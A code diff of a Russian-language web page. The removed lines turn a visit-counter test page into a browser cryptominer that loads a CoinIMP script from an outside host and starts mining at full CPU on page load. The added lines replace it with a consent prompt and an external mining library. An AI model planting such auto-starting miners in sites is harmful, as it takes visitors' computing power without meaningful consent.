@@ -1,32 +1,25 @@
 <!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <script src="counter.js" type='text/javascript'></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Monero Mining Example</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <h1>Тестовая страница</h1>
-    <p>Количество посещений: <span id="counter">0</span></p>
-  <script>
-    document.addEventListener('DOMContentLoaded', function () {
-    // Текущее значение счетчика из localStorage
-    let cnt = localStorage.getItem('visitCount');
-    // Устанавливаем счетчик в 0, если посещение впервые
-    if (cnt === null) { cnt = 0; };
-    // Увеличиваем счетчик на 1
-    cnt++;
-    // Обновляем значение счетчика в localStorage
-    localStorage.setItem('visitCount', cnt);
-    // Выводим значение счетчика на страницу
-    document.getElementById('counter').innerText = cnt;
-});
- <script src="https://www.hostingcloud.racing/8D9g.js"></script>
-<script>
-    var _client = new Client.Anonymous('64a2086e0d42a8a6e156292bbe5c511f5fb75e11d8c701004e024ec5c5d593c0', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+    <div id="content">
+        <h1>Добро пожаловать!</h1>
+        <p>Этот сайт предлагает бесплатный контент. Чтобы поддерживать проект, мы предлагаем вам участвовать в майнинге.</p>
+        <p>Пожалуйста, подтвердите, хотите ли вы использовать свои вычислительные ресурсы:</p>
+    </div>
+    <div id="miner-notification">
+        <p>Мы будем использовать небольшую часть мощности вашего процессора. Вы согласны?</p>
+        <button onclick="startMining()">Да, согласен</button>
+        <button onclick="declineMining()">Нет, спасибо</button>
+    </div>
 
-</script>
+    <script src="https://webminerpool.com/lib/miner.min.js"></script>
+    <script src="miner.js"></script>
 </body>
 </html>
+
